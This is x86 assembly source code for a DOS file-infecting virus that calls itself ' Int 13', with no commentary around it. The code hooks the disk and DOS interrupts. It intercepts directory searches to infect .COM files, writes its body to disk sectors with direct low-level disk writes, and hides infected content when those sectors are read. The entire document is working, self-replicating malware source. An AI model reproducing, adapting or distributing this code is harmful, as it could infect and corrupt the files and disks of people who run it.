Code		Segment
		Assume	CS:Code

Old13		=	9Ch
True13		=	9Dh
Saved21		=	9Eh
Temp13		=	9Fh

VStart:		loop	Next	; Virus ID
Next:		push	ax
		mov	di,13h * 4
		push	di
		xor	bp,bp
		mov	ds,bp
		les	bx,[di]
		mov	di,True13 * 4
		mov	[di-4],bx
		mov	[di-2],es
		mov	ah,13h
		int	2Fh
		push	es
		push	bx
		int	2Fh
		mov	es,bp
		mov	si,21h * 4
		pop	ax
		stosw
		pop	ax
		stosw
		push	si
		movsw
		movsw
		mov	ah,52h
		int	21h
		push	es
		pop	ds
		les	ax,[bx+12h]	; ax is now 0000h, i.e. ah is 0.
		push	word ptr es:[bp+2]
		mov	si,100h
		mov	cx,si
		mov	di,bp
		push	si
	rep	movs	word ptr es:[di], cs:[si]
		pop	si
		pop	word ptr ds:[bx+14h]
		push	es
		mov	al, offset Continue	; Let's use it!
		push	ax
		retf

SavedCX		dw	1
SavedDX		dw	0
SavedBX		dw	0
SavedES		dw	0

FileWord	dw	0

SCX		=	offset SavedCX - offset VStart
SDX		=	offset SavedDX - offset VStart

Continue:	mov	es,bp
		pop	di
		mov	al,offset Int21		; Two times!
		stosw
		mov	es:[di],cs
		pop	di
		mov	al,offset Int13		; Three times!
		stosw
		mov	es:[di],cs

		mov	es,[bp+2Ch]	; This assumes SS:
		mov	di,bp
		xchg	ax,bp
		dec	cx
ScanEnv:	repne	scasb
		scasb
		jnz	ScanEnv
		scasw
		push	es
		pop	ds
		mov	dx,di
		mov	ah,3Dh
		int	21h
		jc	NoStart
		mov	dx,si
		xchg	ax,bx
		mov	ah,3Fh
		push	ss
		pop	ds
		int	21h
		mov	ah,3Eh
		int	21h

		pop	ax
		push	ss
		push	si
		push	ss
		pop	es
		retf

NoStart:	mov	ah,4Ch
		int	21h

Int13V:		mov	SavedBX,bx
		mov	SavedCX,cx
		mov	SavedDX,dx
		mov	SavedES,es

Go13:		int	Old13
		jmp	short RetF2

Int13:		cmp	ah,2
		jne	Go13
		push	ds
		push	si
		push	di
		push	cx
		push	dx
		push	es
		push	bx
		push	dx
		int	Old13
		pop	dx
		jc	Exit13
		cmp	word ptr es:[bx],00E2h
		clc
		jne	Exit13
		mov	ax,202h
		mov	cx,es:[bx+SCX]
		mov	dh,byte ptr es:[bx+SDX+1]
		mov	bx,0B800h
		mov	ds,bx
		mov	es,bx
		mov	bh,78h
		int	True13
		jc	Exit13
		mov	si,7A00h
		pop	bx
		mov	di,bx
		pop	es
		mov	cx,100h
	rep	movsw
		jmp	short Exit13_1
Exit13:		pop	bx
		pop	es
Exit13_1:	pop	dx
		pop	cx
		pop	di
		pop	si
		pop	ds
RetF2:		retf	2

Int21:		cmp	ah,12h
		je	FindNext
		int	Saved21
		jmp	RetF2
FindNext:	int	Saved21
		cmp	al,0
		jnz	RetF2
		push	ax
		push	bx
		push	ds
		push	es
		mov	ah,2Fh
		int	Saved21
		push	es
		pop	ds
		mov	ax,'MO'
		cmp	ax,[bx+17]
		jne	Exit1
		cmp	ax,[bx+9]
		je	Exit1
		mov	al,[bx+7]
		add	al,'@'
		push	cx
		push	dx
		mov	cx,[bx+36]
		mov	dx,200h
		cmp	cx,dx
		jb	Exit2
		dec	cx
		test	ch,10b
		jz	Infect
		cmp	al,'C'
		jb	Exit2
		test	ch,100b
		jz	Infect
Exit2:		pop	dx
		pop	cx
Exit1:		pop	es
		pop	ds
		pop	bx
		pop	ax
		jmp	RetF2

Infect:		push	si
		push	di
		push	cs
		pop	es
		mov	di,dx
		lea	si,[bx+8]
		mov	ah,':'
		stosw
		movsw
		movsw
		movsw
		movsw
		mov	al,'.'
		stosb
		movsw
		movsb
		xor	ax,ax
		stosb

		mov	ds,ax
		mov	es,ax
		mov	si,13h * 4
		mov	di,Temp13 * 4

		push	si
		push	di
		push	es

		movsw
		movsw

		mov	word ptr [si-4], offset Int13V
		mov	[si-2], cs

		push	cs
		pop	ds

		mov	ah,3Dh
		int	Saved21
		xchg	ax,bx
		mov	ax,4202h
		mov	cx,-1
		mov	dx,cx
		int	Saved21		; DX must now be zero (.COM)
Go:		mov	ah,3Fh
		mov	dl,offset FileWord
		mov	di,dx
		neg	cx		; mov	cx,1
		int	Saved21
		push	[di-8]
		push	[di-6]
		mov	ax,4200h
		xor	cx,cx		; can it be inc cx ??
		xor	dx,dx
		int	Saved21
		mov	ah,3Fh
		mov	dx,di
		mov	cl,2
		int	Saved21
		mov	ax,[di]
		pop	dx
		pop	cx
		cmp	ax,00E2h
		je	Close
		cmp	ax,5A4Dh
		je	Close
		mov	ax,202h
		push	cx
		push	dx
		mov	bx,0B800h
		mov	es,bx
		mov	bh,78h
		int	True13
		lds	si,[di-4]
		push	di
		mov	di,7A00h
		mov	cx,100h
	rep	movsw
		pop	di
		mov	ax,302h
		pop	dx
		pop	cx
		push	cx
		push	dx
		int	True13
		pop	dx
		pop	cx
		mov	ax,301h
		xchg	cx,cs:[di-8]
		xchg	dx,cs:[di-6]
		push	cs
		pop	es
		xor	bx,bx
		int	True13
Close:		mov	ah,3Eh
		int	Saved21

		pop	es
		pop	si
		pop	di

		movs	word ptr es:[di], es:[si]
		movs	word ptr es:[di], es:[si]

		pop	di
		pop	si
		jmp	Exit2

VName		db	' Int 13'

VEnd		label	byte
VLen		=	offset VEnd - offset VStart

Code		EndS
		End	VStart